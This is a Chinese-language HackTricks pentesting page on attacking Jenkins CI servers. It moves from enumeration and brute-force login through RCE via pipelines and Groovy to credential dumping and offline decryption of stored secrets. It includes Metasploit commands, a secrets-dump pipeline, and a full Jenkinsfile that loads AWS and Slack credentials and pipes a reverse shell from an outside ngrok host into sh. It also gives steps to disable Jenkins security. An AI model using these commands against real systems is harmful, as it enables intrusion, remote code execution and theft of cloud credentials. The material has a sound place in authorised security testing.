# Jenkins安全

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

Jenkins是一种工具，提供了一种简单的方法，可以使用流水线为几乎**任何**编程语言和源代码仓库建立**持续集成**或**持续交付**（CI/CD）环境。此外，它自动化了各种常规开发任务。虽然Jenkins不能消除**为各个步骤创建脚本的需要**，但它提供了一种比手动构建整个构建、测试和部署工具序列更快速、更可靠的集成方式。

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## 未经身份验证的枚举

为了在没有身份验证的情况下搜索有趣的Jenkins页面（如（_/people_或_/asynchPeople_，这些页面列出了当前用户），您可以使用：
```
msf> use auxiliary/scanner/http/jenkins_enum
```
检查是否可以在无需身份验证的情况下执行命令：
```
msf> use auxiliary/scanner/http/jenkins_command
```
没有凭证的情况下，您可以查看 _**/asynchPeople/**_ 路径或 _**/securityRealm/user/admin/search/index?q=**_ 来获取 **用户名**。

您可以从路径 _**/oops**_ 或 _**/error**_ 获取 Jenkins 版本信息。

![](<../../.gitbook/assets/image (146).png>)

### 已知漏洞

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## 登录

在基本信息中，您可以查看 **登录 Jenkins 的所有方式**：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 注册

您可以找到允许您创建帐户并登录的 Jenkins 实例。就是这么简单。

### **SSO 登录**

如果存在 **SSO 功能**/**插件**，则应尝试使用测试帐户（即测试 **Github/Bitbucket 帐户**）登录应用程序。来自[**这里**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/)的技巧。

### 暴力破解

**Jenkins** 缺乏 **密码策略** 和 **用户名暴力破解防护**。必须进行用户 **暴力破解**，因为可能存在使用 **弱密码** 或 **用户名作为密码**，甚至 **反转的用户名作为密码** 的情况。
```
msf> use auxiliary/scanner/http/jenkins_login
```
### 密码喷洒攻击

使用[此Python脚本](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py)或[此PowerShell脚本](https://github.com/chryzsh/JenkinsPasswordSpray)。

### IP白名单绕过

许多组织将**基于SaaS的源代码管理（SCM）系统**（如GitHub或GitLab）与**内部自托管的CI**解决方案（如Jenkins或TeamCity）结合在一起。这种设置允许CI系统从**SaaS源代码管理供应商接收webhook事件**，主要用于触发流水线作业。

为了实现这一点，组织会**白名单** **SCM平台的IP范围**，允许它们通过**webhook**访问**内部CI系统**。然而，重要的是要注意，**任何人**都可以在GitHub或GitLab上创建一个**帐户**并配置它来**触发webhook**，潜在地向**内部CI系统**发送请求。

查看：[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## 内部Jenkins滥用

在这些场景中，我们假设您有一个有效的帐户来访问Jenkins。

{% hint style="warning" %}
根据Jenkins中配置的**授权**机制和受损用户的权限，您**可能能够或无法执行以下攻击。**
{% endhint %}

有关更多信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### 列出用户

如果您已经访问了Jenkins，您可以在[http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)中列出其他注册用户。

### 转储构建以查找明文密码

使用[此脚本](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py)来转储构建控制台输出和构建环境变量，以便找到明文密码。
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **窃取SSH凭证**

如果受损用户具有足够的权限来创建/修改新的Jenkins节点，并且已经存储了用于访问其他节点的SSH凭证，他可以通过创建/修改节点并设置一个主机来记录凭证而窃取这些凭证，而无需验证主机密钥：

![](<../../.gitbook/assets/image (218).png>)

通常会在**全局提供程序** (`/credentials/`) 中找到Jenkins SSH凭证，因此您也可以像转储任何其他机密一样转储它们。更多信息请参阅[**转储机密部分**](./#dumping-secrets)。

### **Jenkins中的RCE**

在Jenkins服务器中获得**shell**会使攻击者有机会泄露所有**机密**和**环境变量**，并且可以**利用同一网络中的其他机器**甚至**收集云凭证**。

默认情况下，Jenkins将**作为SYSTEM运行**。因此，对其进行妥协将赋予攻击者**SYSTEM权限**。

### **创建/修改项目中的RCE**

创建/修改项目是获得Jenkins服务器上的RCE的一种方法：

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **执行Groovy脚本中的RCE**

您还可以通过执行Groovy脚本获得RCE，这可能比创建新项目更隐蔽：

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### 创建/修改Pipeline中的RCE

您还可以通过创建/修改管道**获得RCE**：

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## 管道利用

要利用管道，您仍然需要访问Jenkins。

### 构建管道

**管道**也可以用作项目中的**构建机制**，在这种情况下，可以配置一个**存储在存储库中的文件**，其中包含管道语法。默认情况下使用 `/Jenkinsfile`：

![](<../../.gitbook/assets/image (127).png>)

还可以**将管道配置文件存储在其他位置**（例如其他存储库）以实现**分离**存储库**访问**和管道访问的目的。

如果攻击者具有对该文件的**写入访问权限**，他将能够**修改**它并**潜在地触发**管道，甚至无需访问Jenkins。\
攻击者可能需要**绕过一些分支保护**（取决于平台和用户权限，可能会被绕过或不会被绕过）。

执行自定义管道的最常见触发器包括：

* 向主分支发起**拉取请求**（或可能是其他分支）
* 向主分支**推送**（或可能是其他分支）
* **更新主分支**并等待某种方式执行

{% hint style="info" %}
如果您是**外部用户**，不应期望创建**针对其他用户/组织存储库的主分支PR**并**触发管道**...但如果**配置不当**，您可能完全**通过利用此方法妥协公司**。
{% endhint %}

### 管道RCE

在前面的RCE部分中已经指出了一种技术来[**修改管道以获得RCE**](./#rce-creating-modifying-pipeline)。

### 检查环境变量

可以为整个管道或特定阶段声明**明文环境变量**。这些环境变量**不应包含敏感信息**，但攻击者始终可以**检查所有管道**配置/Jenkinsfiles：
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### 密钥转储

有关 Jenkins 如何处理密钥的信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

凭据可以**限定为全局提供者**（`/credentials/`）或**特定项目**（`/job/<project-name>/configure`）。因此，为了**提取所有凭据**，您需要**至少入侵包含密钥的所有项目**并执行自定义/恶意的流水线。

还有另一个问题，为了在流水线的**环境中获取密钥**，您需要**知道密钥的名称和类型**。例如，如果您尝试将一个**`usernamePassword`** **密钥**加载为**`string`** **密钥**，您将收到此**错误**：
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
以下是加载一些常见秘密类型的方法：

- **Secret Text**: 使用`Secret text`凭证类型，将秘密文本直接存储在Jenkins中。
- **Username and Password**: 使用`Username with password`凭证类型，将用户名和密码存储在Jenkins中。
- **Secret File**: 使用`Secret file`凭证类型，将秘密文件上传到Jenkins中。
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
在本页的末尾，您可以**找到所有的凭证类型**：[https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
**一次性倾泄所有秘密**的最佳方法是通过**入侵** **Jenkins** 机器（例如在**内置节点**中运行反向 shell），然后**泄漏** **主密钥**和**加密的秘密**，并在离线状态下对其进行解密。\
有关如何执行此操作，请参阅[节点和代理部分](./#nodes-and-agents)和[后渗透部分](./#post-exploitation)。
{% endhint %}

### 触发器

来自[文档](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers)：`triggers` 指令定义了应重新触发 Pipeline 的**自动方式**。对于与 GitHub 或 BitBucket 等源集成的 Pipeline，可能不需要 `triggers`，因为基于 Webhooks 的集成可能已经存在。目前可用的触发器包括 `cron`、`pollSCM` 和 `upstream`。

Cron 示例：
```bash
triggers { cron('H */4 * * 1-5') }
```
查看**文档中的其他示例**。

### 节点和代理

一个**Jenkins实例**可能在不同的机器上运行**不同的代理**。从攻击者的角度来看，访问不同的机器意味着可以窃取**不同的潜在云凭证**或者滥用**不同的网络访问**来利用其他机器。

有关更多信息，请查看基本信息：

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

您可以枚举`/computer/`中**配置的节点**，通常会找到\*\*`内置节点` \*\*（运行Jenkins的节点）和可能还有其他节点：

![](<../../.gitbook/assets/image (249).png>)

**特别有趣的是妥协内置节点**，因为它包含敏感的Jenkins信息。

要指示您想在**内置Jenkins节点**中**运行**流水线，您可以在流水线中指定以下配置：
```bash
pipeline {
agent {label 'built-in'}
```
### 完整示例

在特定代理中的流水线，使用cron触发器，具有流水线和阶段环境变量，在一个步骤中加载2个变量并发送反向shell：
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
## 后渗透

### Metasploit
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Secrets

如果您拥有足够的权限，可以访问 `/credentials/` 来列出秘密。请注意，这将仅列出`credentials.xml`文件中的秘密，但**构建配置文件**可能还包含**更多凭据**。

如果您可以**查看每个项目的配置**，您还可以在其中看到用于访问存储库的**凭据（秘密）名称**和**项目的其他凭据**。

![](<../../.gitbook/assets/image (180).png>)

#### 从 Groovy

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### 从磁盘

这些文件用于**解密 Jenkins 秘密**：

* secrets/master.key
* secrets/hudson.util.Secret

这样的**秘密通常可以在**以下位置找到：

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

以下是用于查找它们的正则表达式：
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### 离线解密 Jenkins 密钥

如果您已经转储了**解密密钥所需的密码**，请使用[**此脚本**](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) **来解密这些密钥**。
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### 从Groovy中解密Jenkins秘密
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### 创建新的管理员用户

1. 访问`/var/lib/jenkins/config.xml`或`C:\Program Files (x86)\Jenkis\`中的Jenkins config.xml文件。
2. 搜索单词`<useSecurity>true</useSecurity>`，将单词`true`更改为`false`。
3. 运行命令`sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`。
4. **重新启动** **Jenkins** 服务器：`service jenkins restart`。
5. 现在再次访问Jenkins门户，并且**Jenkins不会要求任何凭据**。您可以导航到“**管理Jenkins**”以重新设置**管理员密码**。
6. 通过将设置更改为`<useSecurity>true</useSecurity>`，**重新启用安全性**，然后**再次重启Jenkins**。

## 参考资料

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>从零开始学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF版本的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或在**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们**。
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
